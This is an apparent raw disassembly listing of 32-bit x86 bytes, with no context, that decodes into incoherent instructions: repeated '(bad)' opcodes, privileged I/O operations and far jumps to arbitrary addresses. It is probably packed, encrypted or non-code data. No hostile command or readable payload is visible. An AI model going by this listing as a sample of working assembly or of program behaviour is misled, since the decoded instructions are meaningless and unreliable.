  419b33:	pop    es
  419b34:	aam    0x33
  419b36:	push   esp
  419b37:	out    dx,al
  419b38:	sar    BYTE PTR [esi-0x10],1
  419b3b:	sub    DWORD PTR [esi-0x38910414],ecx
  419b41:	inc    edx
  419b42:	ds loop 0x419b29
  419b45:	(bad)  
  419b46:	mov    cl,0x39
  419b48:	dec    esi
  419b49:	fisubr DWORD PTR [ecx+0x418af9a9]
  419b4f:	dec    eax
  419b50:	arpl   cx,cx
  419b52:	or     eax,0x849cbe7c
  419b57:	xor    BYTE PTR [ebp+ebp*1+0x67],bh
  419b5b:	clc    
  419b5c:	rcl    ebp,0xad
  419b5f:	mov    cl,0x1e
  419b61:	aas    
  419b62:	mov    al,ds:0x78e05013
  419b67:	fild   WORD PTR [eax-0x38e75034]
  419b6d:	inc    eax
  419b6e:	xchg   esi,esi
  419b70:	pop    edi
  419b71:	cmc    
  419b72:	mov    bl,0xec
  419b74:	daa    
  419b75:	pop    ebx
  419b76:	stos   DWORD PTR es:[edi],eax
  419b77:	jns    0x419bae
  419b79:	mov    dh,0x4
  419b7b:	arpl   dx,cx
  419b7d:	aad    0x6
  419b7f:	aad    0x69
  419b81:	jp     0x419b65
  419b83:	xchg   edi,eax
  419b84:	in     al,0x76
  419b86:	cmp    BYTE PTR [esi],ch
  419b88:	scas   al,BYTE PTR es:[edi]
  419b89:	xchg   ebx,eax
  419b8a:	jge    0x419bb3
  419b8c:	jo     0x419b32
  419b8e:	add    al,0x9f
  419b91:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  419b93:	out    0xe4,al
  419b95:	cmp    bl,bl
  419b97:	out    dx,al
  419b98:	dec    esi
  419b99:	pushf  
  419b9a:	mov    esi,0xc0e4984b
  419b9f:	inc    edi
  419ba0:	out    dx,eax
  419ba1:	and    al,0xd7
  419ba4:	pop    ebx
  419ba5:	mov    dh,0xc4
  419ba7:	sub    edx,ebp
  419ba9:	lock icebp 
  419bab:	dec    ebp
  419bac:	lahf   
  419bad:	leave  
  419bae:	push   cs
  419baf:	push   edi
  419bb0:	std    
  419bb1:	pop    ss
  419bb2:	sub    DWORD PTR [esi],esp
  419bb4:	jecxz  0x419b5e
  419bb6:	stos   DWORD PTR es:[edi],eax
  419bb7:	inc    esi
  419bb8:	xchg   edx,eax
  419bb9:	repnz (bad) 
  419bbb:	dec    ebx
  419bbc:	sbb    BYTE PTR [edi],cl
  419bbe:	leave  
  419bbf:	dec    eax
  419bc0:	sub    DWORD PTR [esi-0x234181ce],ecx
  419bc6:	sbb    esp,esi
  419bc8:	sahf   
  419bc9:	out    0xef,eax
  419bcb:	les    ebp,FWORD PTR [eax+0xf]
  419bce:	cmp    DWORD PTR [edx+ecx*1-0x62e929d3],ebp
  419bd5:	push   ds
  419bd6:	(bad)  
  419bd7:	xor    DWORD PTR es:[edx-0x1],edx
  419bdb:	mov    al,ds:0x74b8f99e
  419be0:	pop    ebp
  419be1:	lods   eax,DWORD PTR ds:[esi]
  419be2:	mov    ch,0xb3
  419be4:	mov    dh,0xbe
  419be6:	mov    al,ds:0x3eceb640
  419beb:	cmp    al,0x17
  419bed:	xor    DWORD PTR [ecx-0x79c49f7e],esi
  419bf3:	sub    ah,dh
  419bf5:	jb     0x419bfc
  419bf7:	div    bl
  419bf9:	inc    eax
  419bfa:	js     0x419c40
  419bfc:	mul    DWORD PTR [esi]
  419bfe:	test   DWORD PTR [ecx-0xa6861a],0x1ea96cfe
  419c08:	add    DWORD PTR [ebp-0x5126e4cc],ebx
  419c0e:	or     dh,bh
  419c10:	pop    es
  419c11:	or     dh,BYTE PTR ds:0x19082068
  419c17:	xchg   BYTE PTR [ebp+0x3fc8a31b],dh
  419c1d:	in     al,0xe7
  419c1f:	pop    ebx
  419c20:	scas   al,BYTE PTR es:[edi]
  419c21:	outs   dx,BYTE PTR ds:[esi]
  419c22:	xor    DWORD PTR [ebx],esp
  419c24:	dec    edi
  419c25:	fsubr  QWORD PTR ds:0x1538028c
  419c2b:	and    al,BYTE PTR [ebx-0x1c4341f0]
  419c31:	aam    0x1b
  419c33:	adc    BYTE PTR [edx],cl
  419c35:	mov    ch,0xa2
  419c37:	in     al,dx
  419c38:	or     al,0x4d
  419c3a:	les    esp,FWORD PTR [ebp-0x60f2e818]
  419c40:	sbb    cl,bl
  419c42:	push   ebx
  419c43:	fwait
  419c44:	sbb    DWORD PTR [edx-0x2589c0ae],edx
  419c4a:	aam    0xe5
  419c4c:	mov    bh,0x8d
  419c4e:	out    dx,al
  419c4f:	(bad)  
  419c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c52:	xor    al,0x50
  419c54:	xchg   esp,eax
  419c55:	cmp    DWORD PTR [edi+edi*4-0x7cc99e20],ebp
  419c5c:	mov    DWORD PTR [ebx],ebx
  419c5e:	imul   BYTE PTR [ebp-0x74014a5b]
  419c64:	adc    ebx,DWORD PTR [edi-0x677ffe49]
  419c6a:	or     BYTE PTR [eax-0x4],0x45
  419c6e:	enter  0xed73,0x6a
  419c72:	das    
  419c73:	xor    ecx,DWORD PTR [edi+0x54]
  419c76:	retf   
  419c77:	adc    DWORD PTR [esi-0x3d],ecx
  419c7a:	jmp    0x419c73
  419c7c:	push   0xfffffffc
  419c7e:	jnp    0x419c8f
  419c80:	inc    eax
  419c81:	clc    
  419c82:	sbb    al,0x5b
  419c84:	sbb    bl,cl
  419c86:	lds    edx,FWORD PTR [ecx+0x3b]
  419c89:	out    0x63,al
  419c8b:	sbb    BYTE PTR [edi+0x4e542f7f],bl
  419c91:	add    eax,0xa241713e
  419c96:	ss mov esp,0x6c5866ff
  419c9c:	pop    ecx
  419c9d:	out    0x80,eax
  419c9f:	mov    eax,0xcc730ef1
  419ca4:	mov    DWORD PTR [eax],edi
  419ca6:	pusha  
  419ca7:	inc    ecx
  419ca8:	lock mov bl,ah
  419cab:	xchg   ecx,eax
  419cac:	cmp    eax,0xa76c58fc
  419cb1:	std    
  419cb2:	enter  0xe295,0xea
  419cb6:	fstp   DWORD PTR [esi-0x26fa4dfc]
  419cbc:	mov    dh,0xf1
  419cbe:	call   FWORD PTR [esi-0x727550a0]
  419cc4:	sbb    al,0x1
  419cc6:	jne    0x419c85
  419cc8:	or     edi,DWORD PTR [esi-0x15]
  419ccb:	xchg   DWORD PTR [edx],edi
  419ccd:	ds pop ebx
  419ccf:	lods   eax,DWORD PTR ds:[esi]
  419cd0:	adc    BYTE PTR [esi-0x4dc73d25],ah
  419cd6:	jnp    0x419d23
  419cd8:	fwait
  419cd9:	test   BYTE PTR [edx-0x6e],0x43
  419cdd:	jmp    FWORD PTR [eax+0x56]
  419ce0:	and    ah,BYTE PTR [esi-0x63]
  419ce3:	jmp    0xcd7c5f08
  419ce8:	mov    esi,0xce3444e6
  419ced:	rcl    BYTE PTR [edi+ebp*2-0x4],1
  419cf1:	jmp    0x72337776
  419cf6:	addr16 fcmovb st,st(4)
  419cf9:	lods   eax,DWORD PTR ds:[esi]
  419cfa:	stos   BYTE PTR es:[edi],al
  419cfb:	cld    
  419cfc:	cmp    eax,eax
  419cfe:	pushf  
  419cff:	imul   esi,DWORD PTR [eax+edx*8],0xd3655b89
  419d06:	hlt    
  419d07:	fcom   DWORD PTR [ecx+0x29971e0e]
  419d0d:	not    BYTE PTR [edx+0x78]
  419d10:	imul   esp,DWORD PTR [ebx+0x67],0xa698f894
  419d17:	push   0xffffffcf
  419d19:	and    DWORD PTR fs:[edi-0x71dd53be],0x65
  419d21:	test   eax,0xdd389d0
  419d26:	popf   
  419d27:	std    
  419d28:	sti    
  419d29:	data16 into 
  419d2b:	scas   al,BYTE PTR es:[edi]
  419d2c:	popa   
  419d2d:	add    BYTE PTR [di+0x24ef],0x50
  419d33:	sbb    eax,0x3a5c41f4
  419d38:	mov    bl,0xfa
  419d3a:	add    eax,0xffcb246e
  419d3f:	xor    ch,0x3c
  419d42:	arpl   WORD PTR [edi+0x11],bp
  419d45:	test   eax,0x49f7105
  419d4a:	ds ret 
  419d4c:	icebp  
  419d4d:	sbb    dl,BYTE PTR [esi+0x5040e539]
  419d53:	push   ecx
  419d54:	cwde   
  419d55:	cs pusha 
  419d57:	lds    edi,FWORD PTR [edi]
  419d59:	xor    edx,ebp
  419d5b:	cmp    eax,0xc5c59c6f
  419d60:	fistp  DWORD PTR [ecx+0x55d083a1]
  419d66:	arpl   WORD PTR [edi+esi*1],si
  419d69:	cmp    al,0x88
  419d6b:	fimul  WORD PTR [eax-0x2bc02146]
  419d71:	or     DWORD PTR [eax+0x78],edi
  419d74:	sti    
  419d75:	retf   0x216c
  419d78:	dec    eax
  419d79:	outs   dx,DWORD PTR ds:[esi]
  419d7a:	ds pop ds
  419d7c:	std    
  419d7d:	dec    esp
  419d7e:	inc    edi
  419d7f:	nop
  419d80:	and    bl,bl
  419d82:	outs   dx,DWORD PTR ds:[esi]
  419d83:	dec    edi
  419d84:	dec    edi
  419d85:	sbb    al,0xc7
  419d87:	ror    DWORD PTR [edi-0x591c15aa],1
  419d8d:	out    0x62,al
  419d8f:	loopne 0x419db7
  419d91:	or     ah,BYTE PTR [edx+0x4ad9ca10]
  419d97:	mov    ebx,gs
  419d99:	sub    al,0xc3
  419d9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d9c:	mov    dh,0x65
  419d9e:	adc    dh,BYTE PTR [ebp-0x1c3e5556]
  419da4:	jmp    0x419df5
  419da6:	cmp    eax,0x97dce42e
  419dab:	fadd   DWORD PTR [ecx]
  419dad:	jmp    0x419d42
  419daf:	adc    al,0xec
  419db1:	stc    
  419db2:	cmp    eax,0xd98773e2
  419db7:	inc    ebp
  419db8:	fnstenv [eax-0x18ae11a3]
  419dbe:	sbb    eax,0xdf467e9b
  419dc3:	mov    esi,0xe74b3fef
  419dc8:	sbb    edx,DWORD PTR es:[edx]
  419dcb:	xor    al,0x82
  419dcd:	jae    0x419dcb
  419dcf:	mov    cl,0x71
  419dd1:	and    eax,0x989c6b57
  419dd6:	jmp    0x64dd:0xb74876b2
  419ddd:	jl     0x419e0d
  419ddf:	inc    ebp
  419de0:	dec    eax
  419de1:	pop    ds
  419de2:	jecxz  0x419d80
  419de4:	or     DWORD PTR [ecx+0x2e],ebp
  419de7:	in     al,0x24
  419de9:	and    BYTE PTR [esi-0x7c3d5dcb],bl
  419def:	call   0xbd12:0xb973baa
  419df6:	inc    ebx
  419df7:	xchg   esi,ebx
  419df9:	stc    
  419dfa:	cmp    eax,0x4e6b8238
  419dff:	es xor al,0x7f
  419e02:	adc    eax,0xc3c0c6b7
  419e07:	mov    ch,0x72
  419e09:	in     al,0x6f
  419e0b:	inc    ebp
  419e0c:	pop    eax
  419e0d:	sub    al,0x5a
  419e0f:	imul   edx,ebp,0x5481cb47
  419e15:	push   es
  419e16:	mov    esi,0xf00312a4
  419e1b:	mov    WORD PTR [eax-0x5f],?
  419e1e:	dec    ebp
  419e1f:	ret    
  419e20:	mov    esi,0x946462ca
  419e25:	pop    ebx
  419e26:	fimul  DWORD PTR [edi-0x5b]
  419e29:	rcr    DWORD PTR [ecx],0xc3
  419e2c:	dec    ebx
  419e2d:	inc    edi
  419e2e:	mov    cl,0xbc
  419e30:	cli    
  419e31:	repz inc esp
  419e33:	or     ebx,eax
  419e35:	xor    eax,DWORD PTR [edx+0x78]
  419e38:	jp     0x419e44
  419e3a:	xlat   BYTE PTR ds:[ebx]
  419e3b:	mov    al,ds:0x2df38296
  419e40:	out    dx,eax
  419e41:	xlat   BYTE PTR ds:[ebx]
  419e42:	scas   eax,DWORD PTR es:[edi]
  419e43:	inc    edx
  419e44:	jmp    0x30e4a384
  419e49:	mov    ds:0x5a6e48f6,al
  419e4e:	in     eax,dx
  419e4f:	and    edx,DWORD PTR [eax-0x7cfd5004]
  419e55:	mov    bl,0x17
  419e57:	ror    DWORD PTR [edx],cl
  419e59:	mov    ah,0x1c
  419e5b:	popa   
  419e5c:	nop
  419e5d:	or     DWORD PTR [edi+0x5b28a9dd],edi
  419e63:	mov    ?,WORD PTR [edi+0x4e]
  419e66:	push   ecx
  419e67:	mov    ch,0x92
  419e69:	push   DWORD PTR [eax-0x1b27655c]
  419e6f:	in     eax,dx
  419e70:	xlat   BYTE PTR ds:[ebx]
  419e71:	lock out 0x85,al
  419e74:	int    0x48
  419e76:	inc    esi
  419e77:	push   edx
  419e78:	push   es
  419e79:	std    
  419e7a:	adc    ecx,esp
  419e7c:	pop    ebp
  419e7d:	jmp    FWORD PTR [edx]
  419e7f:	mov    ch,BYTE PTR [esi+edx*4-0x2a]
  419e83:	scas   al,BYTE PTR es:[edi]
  419e84:	inc    eax
  419e85:	jno    0x419e89
  419e87:	mov    ds:0xaf0d7268,al
  419e8c:	add    eax,0xd44cbbd3
  419e91:	(bad)  
  419e92:	jmp    0x419ebd
  419e94:	sub    BYTE PTR [esi],al
  419e96:	sbb    eax,edx
  419e98:	mov    esp,0x9997b523
  419e9d:	mov    esp,0x1098f610
  419ea2:	or     eax,0x1a71131c
  419ea7:	call   0x4c1:0xd7c12e40
  419eae:	pop    esi
  419eaf:	or     al,BYTE PTR [ecx+ebx*2+0x13bdfc60]
  419eb6:	ret    
  419eb7:	cmc    
  419eb8:	push   ss
  419eb9:	call   0x2ac1781a
  419ebe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ebf:	jb     0x419e75
  419ec1:	cmp    ah,ah
  419ec3:	enter  0x36ff,0x2f
  419ec7:	leave  
  419ec8:	mov    al,ds:0x450a9068
  419ecd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ece:	adc    al,0xd9
  419ed0:	jae    0x419ed3
  419ed2:	fcom   DWORD PTR [edx]
  419ed4:	adc    ah,BYTE PTR [ebx+0x1eab01d6]
  419eda:	push   ebp
  419edb:	cli    
  419edc:	sbb    al,0xaa
  419ede:	cmp    BYTE PTR ds:[esi],cl
  419ee1:	jg     0x419eae
  419ee3:	inc    ebp
  419ee4:	inc    ebp
  419ee5:	out    0xf,al
  419ee7:	rol    DWORD PTR [eax+ebp*1+0x155e3511],1
  419eee:	pop    esi
  419eef:	outs   dx,DWORD PTR ds:[esi]
  419ef0:	mov    BYTE PTR [ebp+esi*8-0x648f7bb2],al
  419ef7:	pop    ecx
  419ef8:	in     eax,0xa0
  419efa:	aaa    
  419efb:	xor    eax,0x33e71662
  419f00:	lods   eax,DWORD PTR ds:[esi]
  419f01:	dec    eax
  419f02:	(bad)  
  419f03:	mov    bh,0x6e
  419f05:	jge    0x419f71
  419f07:	adc    DWORD PTR [esi],edi
  419f09:	xor    BYTE PTR [ebp+0x3e],ch
  419f0c:	cmp    DWORD PTR [edx+0x5b08c2df],ecx
  419f12:	loop   0x419f31
  419f14:	and    edi,edx
  419f16:	push   edi
  419f17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f18:	pop    ds
  419f19:	jmp    0xc659b824
  419f1e:	cmp    eax,0x7cef98e2
  419f23:	or     edx,eax
  419f25:	xor    esi,DWORD PTR [ecx-0x129b7766]
  419f2b:	pop    eax
  419f2c:	hlt    
  419f2d:	les    ebp,FWORD PTR [eax+0x1e85007f]
  419f33:	sub    eax,0x95012d69
  419f38:	ss adc eax,0x3608dcd5
  419f3e:	cwde   
  419f3f:	call   0x25aa:0x4f0fe68d
  419f46:	in     al,dx
  419f47:	in     eax,dx
  419f48:	sbb    ebx,DWORD PTR [ebp-0x564f6d5e]
  419f4e:	or     BYTE PTR [ebp-0x76],dl
  419f51:	rcl    BYTE PTR [edi-0x77],0x4a
  419f55:	stc    
  419f56:	xchg   DWORD PTR [eax-0x913a52d],esp
  419f5c:	retf   
  419f5d:	ins    BYTE PTR es:[edi],dx
  419f5e:	or     bh,bl
  419f60:	mov    esi,0xcd064054
  419f65:	inc    ebx
  419f66:	jb     0x419f12
  419f68:	lods   al,BYTE PTR ds:[esi]
  419f69:	adc    bl,BYTE PTR [esi]
  419f6b:	retf   
  419f6c:	cmc    
  419f6d:	bound  eax,QWORD PTR ds:0x811664a2
  419f73:	sub    BYTE PTR [ebx+0x2e],dh
  419f76:	xchg   ecx,eax
  419f77:	ins    BYTE PTR es:[edi],dx
  419f78:	data16 jno 0x419fa7
  419f7b:	int3   
  419f7c:	and    eax,0xe5873659
  419f81:	and    eax,0x10e1c030
  419f86:	xor    al,0x5a
  419f88:	mov    ebx,0x77d853c1
  419f8d:	mov    bl,0x72
  419f8f:	cmc    
  419f90:	popf   
  419f91:	gs mov esp,0xee242fbd
  419f97:	jecxz  0x419f4c
  419f99:	and    BYTE PTR [ebp+eiz*2-0x18a34f49],ch
  419fa0:	out    0x2f,eax
  419fa2:	pop    ss
  419fa3:	arpl   WORD PTR [esi-0x5f],cx
  419fa6:	or     al,0x11
  419fa8:	cmp    eax,0x8c4651ba
  419fad:	fcompp 
  419faf:	sti    
  419fb0:	add    eax,0xfef94632
  419fb5:	ja     0x419f72
  419fb7:	loop   0x419f7e
  419fb9:	or     WORD PTR [ebx+edi*2-0x59108d4a],sp
  419fc1:	dec    edi
  419fc2:	movd   mm7,ebx
  419fc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fc6:	mov    ebp,DWORD PTR [esi-0x18]
  419fc9:	ret    0x3a0e
  419fcc:	ss xchg edi,eax
  419fce:	pop    ebx
  419fcf:	retf   
  419fd0:	mov    al,dl
  419fd2:	push   cs
  419fd3:	xor    ebp,DWORD PTR [ebx-0x1]
  419fd6:	cmp    al,0xd6
  419fd8:	out    0xad,eax
  419fda:	push   ss
  419fdb:	and    ch,al
  419fdd:	add    DWORD PTR [ecx],esi
  419fdf:	sahf   
  419fe0:	sahf   
  419fe1:	mov    ah,0x15
  419fe3:	pop    eax
  419fe4:	cmp    bl,BYTE PTR [esi+0x45d626c2]
  419fea:	mov    BYTE PTR [esi-0x18],0xa9
  419fee:	xchg   esi,eax
  419fef:	pop    ecx
  419ff0:	ja     0x41a00e
  419ff2:	sahf   
  419ff3:	xchg   ebx,eax
  419ff4:	sahf   
  419ff5:	fsubr  DWORD PTR [ebp-0x21]
  419ff8:	pop    edx
  419ff9:	lds    esp,FWORD PTR [eax-0x51567ced]
  419fff:	jp     0x41a015
  41a001:	pushf  
  41a002:	imul   edi,edi,0xffffffde
  41a005:	push   ds
  41a006:	cld    
  41a007:	sbb    DWORD PTR [ecx],esp
  41a009:	shl    BYTE PTR [ebx-0x7b],1
  41a00c:	add    al,0x81
  41a00e:	pop    ds
  41a00f:	(bad)  
  41a010:	sbb    BYTE PTR [edx+0x3d49cd1d],dh
  41a016:	popa   
  41a017:	jmp    0x5f8e4328
  41a01c:	adc    bl,dl
  41a01e:	push   esi
  41a01f:	stos   BYTE PTR es:[edi],al
  41a020:	ret    0x7ddb
  41a023:	inc    edi
  41a024:	xchg   ebx,eax
  41a025:	xchg   esp,eax
  41a026:	push   ebp
  41a027:	fistp  QWORD PTR [ebp-0xc]
  41a02a:	or     dh,BYTE PTR [ebp-0x1a08e1d2]
  41a030:	retf   
  41a031:	push   0x5d
  41a033:	jmp    0x41a0a3
  41a035:	mov    DWORD PTR [edx+edi*4],esi
  41a038:	out    dx,eax
  41a039:	dec    ebp
  41a03a:	push   ss
  41a03b:	stos   DWORD PTR es:[edi],eax
  41a03c:	and    bl,bh
  41a03e:	add    ah,BYTE PTR [ebx+ecx*8-0x2935809f]
  41a045:	pop    es
  41a046:	push   0x38
  41a048:	inc    edi
  41a049:	sub    eax,edi
  41a04b:	fnsave [ecx+0x3d74b65c]
  41a051:	imul   ebp,DWORD PTR [eax+0x4a07295b],0xffffffce
  41a058:	es call 0xdcc3:0xb61836d5
  41a060:	xchg   dh,dl
  41a062:	fld    TBYTE PTR es:[edi+0x43]
  41a066:	pusha  
  41a067:	fidivr DWORD PTR [esi]
  41a069:	daa    
  41a06a:	mov    bl,0x3a
  41a06c:	and    eax,0x9cc02362
  41a071:	add    dl,dh
  41a073:	les    edi,FWORD PTR [eax]
  41a075:	and    dl,BYTE PTR [ebp+0x32f219e1]
  41a07b:	js     0x41a084
  41a07d:	out    dx,eax
  41a07e:	loop   0x41a04c
  41a080:	xor    BYTE PTR [ecx+0x7939bf3e],ah
  41a086:	in     al,dx
  41a087:	test   BYTE PTR [ecx],cl
  41a089:	stc    
  41a08a:	in     eax,dx
  41a08b:	cmp    eax,0x157d533b
  41a090:	mov    al,ds:0x42bcff42
  41a095:	mov    WORD PTR [eax+0x16],?
  41a098:	mov    DWORD PTR [edi-0x2e],esp
  41a09b:	pop    ss
  41a09c:	rcr    ah,1
  41a09e:	xor    edi,DWORD PTR [eax-0x1e]
  41a0a1:	fadd   st,st(7)
  41a0a3:	jnp    0x41a05a
  41a0a5:	jge    0x41a0fe
  41a0a7:	inc    edi
  41a0a8:	push   eax
  41a0a9:	cmp    eax,0xd04be314
  41a0af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0b0:	and    DWORD PTR [esi],ebx
  41a0b2:	lods   al,BYTE PTR ds:[esi]
  41a0b3:	jno    0x41a095
  41a0b5:	inc    edx
  41a0b6:	popa   
  41a0b7:	mov    edi,0x631fc008
  41a0bc:	push   eax
  41a0bd:	pop    eax
  41a0be:	sti    
  41a0bf:	dec    ecx
  41a0c0:	jge    0x41a0c1
  41a0c2:	pop    esp
  41a0c3:	lahf   
  41a0c4:	cld    
  41a0c5:	loop   0x41a09b
  41a0c7:	cmc    
  41a0c8:	mov    dl,0x6c
  41a0ca:	popf   
  41a0cb:	std    
  41a0cc:	xor    edi,edx
  41a0ce:	xchg   DWORD PTR [eax-0x4b75322],edi
  41a0d4:	clc    
  41a0d5:	mov    ch,0xe0
  41a0d7:	jnp    0x41a09e
  41a0d9:	mov    BYTE PTR [ebp-0xd],ch
  41a0dc:	add    eax,0x2cd3d5a3
  41a0e1:	out    dx,al
  41a0e2:	xor    ch,al
  41a0e4:	and    ebp,edx
  41a0e6:	cdq    
  41a0e7:	jp     0x41a0d2
  41a0e9:	mov    dl,BYTE PTR [edx]
  41a0eb:	and    eax,0xd9c8efff
  41a0f0:	xchg   ebx,eax
  41a0f1:	test   BYTE PTR [esi-0xa33ce19],0x29
  41a0f8:	xchg   ebx,eax
  41a0f9:	stos   DWORD PTR es:[edi],eax
  41a0fa:	add    al,0xee
  41a0fc:	push   ebp
  41a0fd:	(bad)  
  41a0fe:	mov    esp,0x3abaaebe
  41a103:	into   
  41a104:	adc    edi,ebp
  41a106:	xchg   DWORD PTR ds:0x4962d065,ecx
  41a10c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a10e:	sub    dl,cl
  41a110:	(bad)  
  41a111:	inc    BYTE PTR [esi+eiz*1]
  41a114:	outs   dx,BYTE PTR ds:[esi]
  41a115:	imul   DWORD PTR [eax]
  41a117:	dec    ebx
  41a118:	fld    TBYTE PTR ds:0xbf87e6ae
  41a11e:	popf   
  41a11f:	iret   
  41a120:	fcomp  st(7)
  41a122:	jmp    0x51509828
  41a127:	fld    TBYTE PTR [ecx+0x35]
  41a12a:	pop    eax
  41a12b:	push   0xffffffee
  41a12d:	dec    ebp
  41a12e:	inc    esp
  41a12f:	push   edx
  41a130:	jmp    FWORD PTR [esi+ebx*1+0x71]
  41a134:	jg     0x41a13b
  41a136:	and    dl,BYTE PTR [edx-0x7b]
  41a139:	shl    BYTE PTR [ebp-0x75],cl
  41a13c:	(bad)  
  41a13d:	leave  
  41a13e:	mov    al,0xa3
  41a140:	repnz arpl WORD PTR ds:0x6342dad,bx
  41a147:	sub    eax,0x4315750f
  41a14c:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a14e:	std    
  41a14f:	(bad)  
  41a150:	push   cs
  41a151:	push   0xffffff98
  41a153:	(bad)  
  41a154:	int    0xdf
  41a156:	sbb    BYTE PTR [edi+0x46d0b1d],cl
  41a15c:	cld    
  41a15d:	lods   al,BYTE PTR ds:[esi]
  41a15e:	stc    
  41a15f:	dec    edx
  41a160:	dec    esp
  41a161:	div    ecx
  41a163:	inc    ebp
  41a164:	lds    ebx,FWORD PTR [edx-0x43]
  41a167:	and    dh,BYTE PTR [edi-0x708249ed]
  41a16d:	fcmovnu st,st(4)
  41a16f:	cmp    DWORD PTR [ebp-0x11],edx
  41a172:	add    bl,BYTE PTR [eax+eiz*4+0x35]
  41a176:	sbb    DWORD PTR [esp+esi*1],esi
  41a179:	push   cs
  41a17a:	sub    edi,DWORD PTR [edx]
  41a17c:	pop    ds
  41a17d:	jno    0x41a1be
  41a17f:	pop    edx
  41a180:	jns    0x41a117
  41a182:	mov    dh,bl
  41a184:	or     esp,0x1bf66214
  41a18a:	inc    ecx
  41a18b:	cmp    bl,BYTE PTR [esi]
  41a18d:	jecxz  0x41a190
  41a18f:	(bad)  
  41a190:	cmp    DWORD PTR [edx],ebp
  41a192:	test   DWORD PTR [edi+0x202d74a],0x2c57c9c2
  41a19c:	mov    ds:0xcdb0b3d9,al
  41a1a1:	addr16 push 0xd09584ed
  41a1a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1a8:	dec    eax
  41a1a9:	dec    eax
  41a1aa:	dec    edi
  41a1ab:	outs   dx,BYTE PTR ds:[esi]
  41a1ac:	cmp    eax,0x8654a996
  41a1b1:	sbb    cl,BYTE PTR [esi]
  41a1b3:	popa   
  41a1b4:	push   ds
  41a1b5:	sub    DWORD PTR [ecx+0x711db0f0],ebp
  41a1bb:	(bad)  
  41a1bc:	retf   
  41a1bd:	imul   ecx,DWORD PTR [edi+0x7452efb5],0x28603304
  41a1c7:	push   ecx
  41a1c8:	fld    QWORD PTR [ebx-0x70190792]
  41a1ce:	std    
  41a1cf:	stos   BYTE PTR es:[edi],al
  41a1d0:	inc    esi
  41a1d1:	cmp    bl,BYTE PTR [ecx]
  41a1d3:	xor    DWORD PTR [edi-0x23d7dea4],ebx
  41a1d9:	xchg   esp,eax
  41a1da:	jns    0x41a1ef
  41a1dc:	ds pop edi
  41a1de:	push   0x17
  41a1e0:	test   eax,0x24efb610
  41a1e5:	outs   dx,BYTE PTR ds:[esi]
  41a1e6:	xabort 0xdf
  41a1e9:	aaa    
  41a1ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1eb:	jns    0x41a217
  41a1ed:	sbb    eax,0x27f2f986
  41a1f2:	daa    
  41a1f3:	sbb    ah,ah
  41a1f5:	pop    edx
  41a1f6:	add    dh,BYTE PTR ds:[ebp+0x33]
  41a1fa:	dec    ecx
  41a1fb:	lahf   
  41a1fc:	jmp    0x41a1d0
  41a1fe:	enter  0x1dbf,0x45
  41a202:	arpl   WORD PTR [edx-0x44],sp
  41a205:	pusha  
  41a206:	call   0xc8f0a340
  41a20b:	sub    eax,0xc5c02a1
  41a210:	out    0x3a,al
  41a212:	rol    DWORD PTR [edi+0x70135484],1
  41a218:	add    eax,0x1c165011
  41a21d:	fild   QWORD PTR [eax]
  41a21f:	add    ebp,DWORD PTR [esi]
  41a221:	mov    ecx,DWORD PTR [ebx+0x1]
  41a224:	bound  ebx,QWORD PTR [ebp+0x36fca105]
  41a22a:	retf   0x7e92
  41a22d:	push   ecx
  41a22e:	sbb    dl,BYTE PTR [edx+0x43]
  41a231:	and    eax,DWORD PTR [esi-0x7388abb6]
  41a237:	push   ss
  41a238:	push   ebp
  41a239:	pop    ss
  41a23a:	out    dx,al
  41a23b:	add    DWORD PTR [eax],esi
  41a23d:	out    0xd8,eax
  41a23f:	xchg   BYTE PTR [ecx-0x57],dh
  41a242:	xchg   DWORD PTR [eax+0x6701c2f],ebx
  41a248:	push   0x2
  41a24a:	test   BYTE PTR [ebx+0x6c768971],cl
  41a250:	repz aas 
  41a252:	test   DWORD PTR [ecx-0x74],0x6e9d2885
  41a259:	imul   BYTE PTR [edi-0x2716ac0b]
  41a25f:	jmp    0x41a219
  41a261:	push   ss
  41a262:	mov    cl,BYTE PTR [esi]
  41a264:	mov    WORD PTR [edx-0x1b],fs
  41a267:	mov    ah,0xd8
  41a26a:	adc    al,0xf
  41a26c:	xchg   BYTE PTR [ebp-0x15bee995],dl
  41a272:	cmp    eax,0xfc86e4f0
  41a277:	sbb    eax,0xf07d4341
  41a27c:	and    esi,ebp
  41a27e:	or     edi,ebp
  41a280:	(bad)  
  41a281:	jns    0x41a28f
  41a283:	mov    dh,0x47
  41a285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a286:	mov    ebp,0xf71e2b2e
  41a28b:	cmp    bl,BYTE PTR [edx-0x84ca14b]
  41a291:	int    0x2b
  41a293:	fcmovnb st,st(4)
  41a295:	je     0x41a22f
  41a297:	mov    al,0x84
  41a299:	enter  0xe301,0xf1
  41a29d:	stos   BYTE PTR es:[edi],al
  41a29e:	jmp    0x7e3d14
  41a2a3:	adc    BYTE PTR [ebp+0x0],ch
  41a2a6:	dec    esp
  41a2a7:	mov    eax,0xc17b036a
  41a2ac:	loope  0x41a2e1
  41a2ae:	and    BYTE PTR [edx+0x23],0xd5
  41a2b2:	inc    eax
  41a2b3:	pushf  
  41a2b4:	jnp    0x41a327
  41a2b6:	adc    eax,0xf6e3cf90
  41a2bb:	loopne 0x41a339
  41a2bd:	mov    ch,ch
  41a2bf:	xchg   ebx,eax
  41a2c0:	rol    ch,cl
  41a2c2:	push   ebp
  41a2c3:	mov    BYTE PTR [edi+0x3e2f5a9b],dl
  41a2c9:	dec    esi
  41a2ca:	jae    0x41a2f2
  41a2cc:	dec    esi
  41a2cd:	jo     0x41a339
  41a2cf:	sbb    eax,0xb07f0511
  41a2d4:	mov    dh,0x5d
  41a2d6:	mov    edx,0x55f8c624
  41a2db:	shr    al,0xdb
  41a2de:	xor    esi,DWORD PTR [edx+0x42b457ba]
